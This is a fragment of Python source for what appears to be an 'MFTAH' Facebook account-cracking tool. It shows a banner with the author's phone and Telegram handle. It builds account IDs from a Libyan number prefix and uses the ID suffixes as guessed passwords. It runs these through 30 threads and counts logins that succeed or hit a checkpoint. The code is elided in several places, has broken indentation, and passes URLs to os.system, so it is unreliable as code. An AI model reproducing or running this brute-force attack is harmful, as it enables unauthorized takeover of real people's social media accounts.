...
oks = []
twf = []
os.system('https://www.facebook.com/profile.php?id=100089093683098')
os.system('https://www.facebook.com/profile.php?id=100089093683098')
...

•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••   
•\033[93m𝗧𝗢𝗨𝗥 𝗡𝗔𝗠𝗘•𝗠𝗙𝗧𝗔𝗛
•\033[1;36mTNUR NUMBER•𝟬𝟵𝟭𝟱𝟯𝟳𝟴𝟳𝟬𝟱📞
•\033[95m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞•𝗠𝗙𝗧𝗔𝗛 
•\033[93mTELEGRAM•@MFTAH512
•\033[1;31mTOOL VIRSION•4•11•2023
•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••                  
\033[1;91m=========================================================="""
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  M F T A H  \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f" 21892 ,21891 ,21894 ,21893")
    print(f"2010 ,2011 ,2012")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
      print(f" {BLUE}TOTAL\033[95m IDZ             : {GREEN}"+tl)
        print(f" {BLUE}\033[95mCOUNTRY YOU CHOOSE    : {GREEN}\033[91mLibya  ")
        print(f" {BLUE}\033[95mNUMBER YOU PUT        : {GREEN}"+code)
        print(f" {BLUE}\033[95mPROCESS HAS BEEN STARTED")
        print(f'{GREEN}===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[MFTAH] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
